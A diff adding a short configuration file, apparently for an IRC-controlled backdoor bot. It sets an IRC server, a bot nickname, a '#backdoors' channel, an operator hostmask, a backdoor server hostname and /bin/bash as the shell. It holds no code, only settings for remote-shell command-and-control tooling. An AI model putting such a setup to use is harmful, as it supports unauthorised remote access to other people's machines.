@@ -1,0 +1,7 @@
+host = 'irc.efnet.org'
+botnick = 'i_am_a_bot'
+channel = '#backdoors'
+opmask = 'username@unaffiliated/username'
+backdoorserver = 'myhost.dyndns.org'
+shell = '/bin/bash'
+
